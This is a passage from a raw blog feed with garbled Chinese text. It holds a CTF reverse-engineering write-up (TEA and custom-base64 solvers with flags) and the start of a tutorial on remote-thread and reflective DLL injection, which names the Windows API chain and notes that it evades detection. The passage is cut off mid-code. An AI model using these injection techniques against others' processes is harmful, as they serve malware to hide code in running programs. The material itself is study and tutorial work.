class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta[] = &#123; <span class="number">0x26</span>, <span class="number">0x1e27</span>, <span class="number">0x52f6</span>, <span class="number">0x985</span>, <span class="number">0x2297</span>, <span class="number">0x2e15</span>, <span class="number">0x20ad</span>, <span class="number">0x7e1d</span>, <span class="number">0x28d2</span>, <span class="number">0x7794</span>, <span class="number">0x16dd</span>, <span class="number">0x6dc4</span>, <span class="number">0x476</span>, <span class="number">0x119</span>, <span class="number">0x5039</span>, <span class="number">0x3e31</span>, <span class="number">0x22f1</span>, <span class="number">0x66ad</span>, <span class="number">0xbb5</span>, <span class="number">0x3958</span>, <span class="number">0x51f0</span>, <span class="number">0x7c93</span>, <span class="number">0x5497</span>, <span class="number">0x6532</span>, <span class="number">0x4819</span>, <span class="number">0x52b</span>, <span class="number">0x70d1</span>, <span class="number">0x8c0</span>, <span class="number">0x25fd</span>, <span class="number">0x7e16</span>, <span class="number">0x98e</span>, <span class="number">0x24e</span>, <span class="number">0x348</span>, <span class="number">0x489b</span>, <span class="number">0x420b</span>, <span class="number">0x52f5</span>, <span class="number">0x5c3b</span>, <span class="number">0x3149</span>, <span class="number">0x30a8</span>, <span class="number">0x363</span>, <span class="number">0x735d</span>, <span class="number">0x1ade</span>, <span class="number">0x6e3f</span>, <span class="number">0x45df</span>, <span class="number">0x7b6d</span>, <span class="number">0x5068</span>, <span class="number">0x2fb4</span>, <span class="number">0x7987</span>, <span class="number">0x1d9a</span>, <span class="number">0x42aa</span>, <span class="number">0x1dcd</span>, <span class="number">0x72dc</span>, <span class="number">0x2ff7</span>, <span class="number">0x34c1</span>, <span class="number">0x5f44</span>, <span class="number">0x2d81</span>, <span class="number">0x3029</span>, <span class="number">0x1c08</span>, <span class="number">0x91b</span>, <span class="number">0x4b40</span>, <span class="number">0x5662</span>, <span class="number">0x3738</span>, <span class="number">0x6930</span>, <span class="number">0x44e</span>, <span class="number">0x5494</span>, <span class="number">0x20d4</span>, <span class="number">0x5f11</span>, <span class="number">0x6cd0</span>, <span class="number">0x15de</span>, <span class="number">0x60c4</span>, <span class="number">0x3711</span>, <span class="number">0x339d</span>, <span class="number">0x124b</span>, <span class="number">0x413f</span>, <span class="number">0x3b9c</span>, <span class="number">0x3e46</span>, <span class="number">0xabb</span>, <span class="number">0x6aef</span>, <span class="number">0x70c7</span>, <span class="number">0x4654</span>, <span class="number">0x4121</span>, <span class="number">0xc50</span>, <span class="number">0x2e2b</span>, <span class="number">0x5bd0</span>, <span class="number">0xef</span>, <span class="number">0x105a</span>, <span class="number">0xaf4</span>, <span class="number">0x7109</span>, <span class="number">0xbcf</span>, <span class="number">0x285f</span>, <span class="number">0x5035</span>, <span class="number">0x5391</span>, <span class="number">0x3e94</span>, <span class="number">0x2d36</span>, <span class="number">0x657f</span>, <span class="number">0x3689</span>, <span class="number">0x270</span>, <span class="number">0x1b99</span>, <span class="number">0x6bb1</span>, <span class="number">0x321e</span>, <span class="number">0x5e67</span>, <span class="number">0x2fcc</span>, <span class="number">0x7a11</span>, <span class="number">0x5c54</span>, <span class="number">0x3d03</span>, <span class="number">0x647f</span>, <span class="number">0x319c</span>, <span class="number">0x5f03</span>, <span class="number">0x3a4a</span>, <span class="number">0x58f6</span>, <span class="number">0x1a9b</span>, <span class="number">0x2f1e</span>, <span class="number">0xded</span>, <span class="number">0x6267</span>, <span class="number">0x77</span>, <span class="number">0x493b</span>, <span class="number">0x65c2</span>, <span class="number">0x4ca4</span>, <span class="number">0x3fce</span>, <span class="number">0x1750</span>, <span class="number">0x4474</span>, <span class="number">0xdf9</span>, <span class="number">0x3ac6</span>, <span class="number">0x63bb</span>, <span class="number">0x387a</span>, <span class="number">0x7258</span>, <span class="number">0x67a2</span>, <span class="number">0x7d86</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum[] = &#123; <span class="number">0x6f0f9</span>, <span class="number">0x7d7e9</span>, <span class="number">0x76142</span>, <span class="number">0x873fc</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span>* k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta = <span class="number">0x61C88647</span>, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">delta = rand();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, delta);</span><br><span class="line">sum += delta;</span><br><span class="line">v0 += (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum + v1) ^ (k[<span class="number">0</span>] + (v1 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">v1 += (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum + v0) ^ (k[<span class="number">2</span>] + (v0 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">int</span>* k, <span class="type">int</span> round)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt; <span class="number">-1</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum[round] + v0) ^ (k[<span class="number">2</span>] + (v0 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">v0 -= (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum[round] + v1) ^ (k[<span class="number">0</span>] + (v1 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">sum[round] -= delta[round * <span class="number">32</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">srand(<span class="number">0</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">9</span>] = &#123;</span><br><span class="line"><span class="number">0xEA2063F8</span>, <span class="number">0x8F66F252</span>, <span class="number">0x902A72EF</span>, <span class="number">0x411FDA74</span>, <span class="number">0x19590D4D</span>, <span class="number">0xCAE74317</span>, <span class="number">0x63870F3F</span>, <span class="number">0xD753AE61</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 8; i += 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//TEA_encrypt(&amp;last[i], key);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> round = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &gt; <span class="number">-1</span>; i -= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">TEA_decrypt(&amp;last[i], key, round);</span><br><span class="line">round--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nDecrypted values:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%X 0x%X\n&quot;</span>, last[i], last[i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)last);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d<span class="number">555</span>ce<span class="number">75</span>ec<span class="number">293</span><span class="keyword">c</span><span class="number">8</span>ed<span class="number">232</span>d<span class="number">83</span>dffb<span class="number">0</span>ff<span class="number">82</span></span><br></pre></td></tr></table></figure><h3 id="Rafflesia">Rafflesia</h3><p>mainé‡Œé¢æœ‰èŠ±ï¼Œå»äº†ï¼Œç„¶åçœ‹åˆ°tlsé‡Œæœ‰åè°ƒï¼Œæ”¹è·³è½¬è·³è¿‡</p><p><img src="https://s2.loli.net/2024/11/09/Y6K7bgpdWO32ANG.png" alt="image-20241109175055679"></p><p>è¿™ä¸ªèŠ±ä¸ä¼šå»ï¼Œä½†æ˜¯å¤§æ¦‚èƒ½çœ‹æ‡‚</p><p>å¥½åƒå°±æ˜¯ä¸€ä¸ªbase64å˜è¡¨</p><p>ç›´æ¥è°ƒè¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">last = <span class="string">b&#x27;H@^jHwpsH)[jH&#123;M/\\tBBK_|-O&#123;W.iJZ7\\)|~zaB^H+Lwv&#123;SS|-j@\\_[Y&#x27;</span></span><br><span class="line">last = xor(last,<span class="number">0x18</span>).decode()</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">table = <span class="string">&#x27;HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0&#x27;</span></span><br><span class="line">otable = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> last:</span><br><span class="line">    result += otable[table.index(ch)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((b64decode(result)))</span><br><span class="line"><span class="comment"># flag&#123;8edae458-4tf3-2ph2-9f26-1f8719ec8f8d&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DLLåå°„æ³¨å…¥</title>
      <link href="/posts/76312a14.html"/>
      <url>/posts/76312a14.html</url>
      
        <content type="html"><![CDATA[<h2 id="è¿œç¨‹çº¿ç¨‹æ³¨å…¥">è¿œç¨‹çº¿ç¨‹æ³¨å…¥</h2><p>ä¹‹å‰æœ€æ™®é€šçš„æ–¹æ³•æ˜¯åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ³¨å…¥DLLï¼Œå…·ä½“æµç¨‹æ˜¯<br>æ³¨å…¥å™¨æ‰¾åˆ°ç›®æ ‡è¿›ç¨‹å¥æŸ„ï¼Œç”³è¯·ä¸€æ®µå†…å­˜ï¼Œå†™å…¥DLLè·¯å¾„ï¼Œç„¶ååˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œå°†LoadLibraryä½œä¸ºå‡½æ•°æŒ‡é’ˆä¼ å…¥ï¼ŒæŠŠDLLè·¯å¾„ä½œä¸ºå‚æ•°è¿›è¡Œæ‰§è¡Œï¼Œä»è€ŒåŠ è½½æˆ‘ä»¬çš„æ¶æ„DLL</p><p>éœ€è¦çš„WindowsAPIå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateToolhelp32Snapshot();//æšä¸¾è¿›ç¨‹,ç„¶åæ¯”è¾ƒè¿›ç¨‹åpe.szExeFileå’Œå·²çŸ¥å­—ç¬¦ä¸²è·å–å¥æŸ„</span></span><br><span class="line">OpenProcess();<span class="comment">//é€šè¿‡pidè·å–å¥æŸ„</span></span><br><span class="line"></span><br><span class="line">VirtualAllocEx();<span class="comment">//ç”³è¯·ç©ºé—´</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//å†™å…¥å­—ç¬¦ä¸²</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//åˆ›å»ºçº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line">LoadLibrary();<span class="comment">//è£…è½½DLL</span></span><br></pre></td></tr></table></figure><h2 id="åå°„å‹DLLæ³¨å…¥">åå°„å‹DLLæ³¨å…¥</h2><p>å®ƒå’Œä¸Šé¢çš„æ³¨å…¥æ–¹å¼ä¸ä¸€æ ·çš„åœ°æ–¹åœ¨äºæˆ‘ä»¬ä¸ä½¿ç”¨LoadLibraryå‡½æ•°å»è£…è½½DLLï¼Œå®ƒæ²¡æœ‰å‘æ“ä½œç³»ç»Ÿæ³¨å†Œæœ¬èº«ï¼Œä»ä¸€å®šç¨‹åº¦ä¸Šè§„é¿äº†éƒ¨åˆ†æ£€æµ‹ã€‚</p><p>æµç¨‹ï¼š</p><p>æ³¨å…¥å™¨æ‰¾åˆ°ç›®æ ‡è¿›ç¨‹å¥æŸ„ï¼Œç”³è¯·ä¸€æ®µå†…å­˜å†™å…¥DLLæ–‡ä»¶ï¼ŒDLLæ–‡ä»¶ä¸­æœ‰è‡ªå±•å¼€ä»£ç ï¼Œé€šè¿‡å¯¼å‡ºè¡¨æ‰¾åˆ°è‡ªå±•å¼€ä»£ç ï¼Œæ³¨å…¥å™¨åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œè‡ªå±•å¼€ä»£ç ã€‚åŠ è½½å®Œæ¯•ï¼Œè·³è½¬åˆ°DLLmainæ‰§è¡Œé€»è¾‘ã€‚</p><h3 id="ç»†èŠ‚">ç»†èŠ‚</h3><p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªåœ°æ–¹ï¼š<br>å¦‚æœç°åœ¨æœ¬èº«ç©ºé—´å±•å¼€ï¼Œç„¶åå¤åˆ¶åˆ°ç›®æ ‡è¿›ç¨‹ï¼Œé‚£ä¹ˆä¼šå¯¼è‡´åŸºåœ°å€ä¸å¯¹ï¼Œè¿›è€Œå¯¼è‡´é‡å®šä½è¡¨ä¿®å¤å¤±æ•ˆï¼Œä¸æ­¤åŒæ—¶ï¼Œä¿®å¤çš„æ¨¡å—çš„å¯¼å…¥è¡¨ä¹Ÿå¯¹ä¸ä¸Šï¼Œæ‰€ä»¥éœ€è¦åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ä¿®å¤ã€‚</p><p>ä½†æ˜¯å¦‚æœæ‰§è¡Œäº†loadLibraryé‚£å°±å’Œæ™®é€šçš„è¿œç¨‹çº¿ç¨‹æ³¨å…¥ä¸€æ ·äº†ï¼Œæ‰€ä»¥åªèƒ½é€’å½’è°ƒç”¨æˆ‘ä»¬å†™çš„LoadLibrary?<br>æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥é¿å…å—ï¼ŸåŸºåœ°å€å¯ä»¥é€šè¿‡åœ¨ç›®æ ‡è¿›ç¨‹åˆ†é…å¥½ç©ºé—´ä¹‹åæ¥å›ºå®šåœ¨loaderä¸­çš„å†…å­˜åœ°å€æ¥å®ç°ï¼Œç„¶åç³»ç»ŸDLLçš„å‡½æ•°åœ°å€è‚¯å®šæ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥åªè¦æ²¡æœ‰ä½¿ç”¨é¢å¤–çš„DLLï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨ä¸»å†…å­˜å±•å¼€åå†å¤åˆ¶è¿‡å»ã€‚</p><p>åŒæ—¶ï¼Œåœ¨åŠ è½½çš„æ—¶å€™ï¼Œå¦‚æœä¸æ˜¯æŠŠå±•å¼€å†™åœ¨DLLé‡Œé¢ï¼Œå°±è¦åœ¨DLLé‡Œé¢å†™ä¸€ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œç”¨å®ƒå»æ‰§è¡Œdllmainï¼Œå¦åˆ™createremotethreadå‡½æ•°ä¸æ”¯æŒå¤šå‚æ•°è¿›ç¨‹ï¼Œä¸èƒ½ç›´æ¥è°ƒç”¨ã€‚æ‰€ä»¥è¦å†™éå†å¯¼å…¥è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>å¯¼å…¥è¡¨ç»“æ„ï¼Œé€šè¿‡åŒæ—¶éå†AddressOfFunctionsï¼ŒAddressOfNameså’ŒAddressOfNameOrdinalsæŸ¥æ‰¾å¯¹åº”åç§»åœ°å€ã€‚å…¶ä¸­å‡½æ•°åå’Œåºå·æ•°ç»„æ˜¯åŒæ­¥çš„ï¼Œå¯¹åº”ä½ç½®çš„å‡½æ•°åå¯¹åº”å¯¹åº”çš„åºå·ã€‚</p><p>éœ€è¦çš„WindowsAPIå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateToolhelp32Snapshot();//æšä¸¾è¿›ç¨‹,ç„¶åæ¯”è¾ƒè¿›ç¨‹åpe.szExeFileå’Œå·²çŸ¥å­—ç¬¦ä¸²è·å–å¥æŸ„</span></span><br><span class="line">OpenProcess();<span class="comment">//é€šè¿‡pidè·å–å¥æŸ„</span></span><br><span class="line"></span><br><span class="line">VirtualAllocEx();<span class="comment">//ç”³è¯·ç©ºé—´</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//å†™å…¥å†…å®¹</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//åˆ›å»ºçº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line">GetModuleHandle();<span class="comment">//å–æ¨¡å—å¥æŸ„</span></span><br><span class="line">GetProcAddress();<span class="comment">//å–å‡½æ•°åœ°å€</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœæ˜¯åœ¨è‡ªå·±çš„è¿›ç¨‹å…ˆæ‰§è¡Œï¼Œç„¶åå¤åˆ¶åˆ°ç›®æ ‡è¿›ç¨‹è¿›è¡Œæ“ä½œï¼ˆåªè¦ä¸æ¶‰åŠå¯¼å…¥å…¶å®ƒåº“å°±å¯ä»¥ï¼‰é‚£ä¹ˆåœ¨ç›®æ ‡è¿›ç¨‹ä¸­åªæœ‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OpenProcess();<span class="comment">//é€šè¿‡pidè·å–å¥æŸ„</span></span><br><span class="line"></span><br><span class="line">VirtualAllocEx();<span class="comment">//ç”³è¯·ç©ºé—´</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//å†™å…¥å†…å®¹</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//åˆ›å»ºçº¿ç¨‹</span></span><br></pre></td></tr></table></figure><h2 id="å®è·µ">å®è·µ</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ReflectLoader.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* DLLpath = <span class="string">&quot;C:\\Users\\a2879\\source\\repos\\DLLreflectLoader\\x64\\Debug\\messageboxDLL.dll&quot;</span>;</span><br><span class="line">DWORD dwPid = <span class="number">0</span>;</span><br><span class="line">std::cin &gt;&gt; dwPid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">ReflectLoader <span class="title">myPE</span><span class="params">(dwPid, DLLpath)</span></span>;</span><br><span class="line"><span class="comment">//myPE.setflag(1);</span></span><br><span class="line">myPE.<span class="built_in">run</span>(<span class="string">&quot;getInMain&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span 